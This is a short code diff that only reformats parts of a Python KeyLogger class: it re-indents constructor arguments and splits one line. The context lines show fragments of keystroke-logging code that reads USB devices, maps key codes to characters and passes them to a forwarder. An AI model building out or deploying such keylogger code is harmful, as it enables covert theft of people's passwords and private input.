@@ -14,10 +14,10 @@ class KeyLogger:
     __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]
 
     def __init__(
-            self,
-            keyboard_layout: dict[int, list[int, int]],
-            data_handler: DataHandler,
-            forwarder: Forwarder,
+        self,
+        keyboard_layout: dict[int, list[int, int]],
+        data_handler: DataHandler,
+        forwarder: Forwarder,
     ) -> None:
         # get all USB Devices
         self.__devices: list[int, int] = self.get_devices()
@@ -65,7 +65,11 @@ class KeyLogger:
                     if self.keyboard_layout[str(key_code)] == [None, None]:
                         continue
 
-                    offset: int = int((lambda u: u[0] if lowercase else u[1])(self.keyboard_layout[str(key_code)]))
+                    offset: int = int(
+                        (lambda u: u[0] if lowercase else u[1])(
+                            self.keyboard_layout[str(key_code)]
+                        )
+                    )
                     if offset is None:
                         continue
                 except Exception:
